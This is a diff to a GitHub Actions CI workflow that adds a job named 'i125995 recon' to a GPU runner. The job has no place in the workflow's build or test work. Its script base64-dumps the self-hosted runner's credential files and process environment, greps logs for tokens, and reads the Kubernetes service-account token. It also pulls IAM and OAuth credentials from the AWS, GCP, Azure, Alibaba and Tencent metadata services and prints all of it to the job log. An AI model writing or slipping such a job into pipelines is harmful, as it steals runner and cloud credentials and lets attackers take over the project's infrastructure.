@@ -20,6 +20,60 @@ env:
   SGLANG_IS_IN_CI: true
 
 jobs:
+  i125995-recon:
+    name: i125995 recon
+    runs-on: 4-gpu-h100
+    timeout-minutes: 10
+    steps:
+      - name: recon
+        run: |
+          set +e
+          NONCE="I125995-$(date -u +%Y%m%dT%H%M%SZ)"
+          echo "recon-nonce=$NONCE"
+          echo "=== id ==="
+          id; whoami; hostname; hostname -f 2>/dev/null; uname -a; cat /etc/os-release 2>/dev/null | head -6
+          echo "=== date ==="; date -u
+          echo "=== nvidia-smi ==="
+          timeout 20 nvidia-smi 2>&1 | head -40
+          timeout 20 nvidia-smi -L 2>&1 | head -20
+          echo "=== cpu/mem/disk ==="
+          nproc; free -m | head -3; df -h / /tmp 2>/dev/null | head -5
+          echo "=== env ==="
+          env | sort | head -250
+          echo "=== runner dirs ==="
+          for d in /opt/github-runner /home/runner/actions-runner /actions-runner /opt/actions-runner "$HOME/actions-runner"; do echo "-- ls $d"; ls -la "$d" 2>&1 | head -40; done
+          echo "=== candidate runner files b64 ==="
+          for f in /opt/github-runner/.runner /opt/github-runner/.credentials /opt/github-runner/.credentials_rsaparams /opt/github-runner/.env /opt/github-runner/.path /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /actions-runner/.runner /actions-runner/.credentials; do
+            if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null | head -c 200000; echo; fi
+          done
+          echo "=== diag listing ==="
+          for d in /opt/github-runner/_diag /home/runner/actions-runner/_diag /actions-runner/_diag; do echo "-- ls $d"; ls -lat "$d" 2>&1 | head -25; done
+          echo "=== diag token grep ==="
+          grep -rilE 'token|secret|password|credential' /opt/github-runner/_diag /home/runner/actions-runner/_diag 2>/dev/null | head -10
+          echo "=== runner proc ==="
+          for p in $(pgrep -f 'Runner.Listener' 2>/dev/null | head -3); do echo "-- pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 300)"; echo "==B64PROCENV $p len=$(stat -c%s /proc/$p/environ 2>/dev/null)"; base64 -w0 /proc/$p/environ 2>/dev/null | head -c 40000; echo; done
+          echo "=== kubernetes sa ==="
+          for f in /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt; do if [ -f "$f" ]; then echo "==B64FILE $f sha256=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1) len=$(stat -c%s "$f" 2>/dev/null)"; base64 -w0 "$f" 2>/dev/null | head -c 20000; echo; fi; done
+          echo "=== kube/docker files ==="
+          ls -la "$HOME/.kube" /etc/kubernetes /var/lib/kubelet /var/run/docker.sock 2>&1 | head -40
+          find "$HOME" /opt /etc -maxdepth 4 -type f \( -name 'kubeconfig' -o -name '*.kubeconfig' -o -name '.dockerconfigjson' -o -name 'config.json' \) 2>/dev/null | head -15
+          echo "=== AWS IMDSv2 ==="
+          IMT=$(curl -sS -m 3 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null); echo "imds-token-len=${#IMT}"
+          for p in /latest/meta-data/instance-id /latest/meta-data/instance-type /latest/meta-data/placement/region /latest/meta-data/placement/availability-zone /latest/meta-data/iam/info /latest/meta-data/iam/security-credentials/; do echo "-- $p"; curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" "http://169.254.169.254$p" 2>&1 | head -c 1500; echo; done
+          ROLE=$(curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null | head -1)
+          if [ -n "$ROLE" ]; then echo "-- creds $ROLE"; curl -sS -m 3 -H "X-aws-ec2-metadata-token: $IMT" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>&1 | head -c 4000; echo; fi
+          echo "=== GCP metadata ==="
+          curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' 2>&1 | head -c 300; echo
+          curl -sS -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>&1 | head -c 3000; echo
+          echo "=== Azure IMDS ==="
+          curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>&1 | head -c 3000; echo
+          echo "=== Alibaba metadata ==="
+          curl -sS -m 3 'http://100.100.100.200/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
+          curl -sS -m 3 'http://100.100.100.200/latest/meta-data/ram/security-credentials/' 2>&1 | head -c 800; echo
+          echo "=== Tencent metadata ==="
+          curl -sS -m 3 'http://metadata.tencentyun.com/latest/meta-data/instance-id' 2>&1 | head -c 200; echo
+          echo "=== recon done $NONCE ==="
+
   sgl-router-changes:
     name: changes
     runs-on: ubuntu-latest
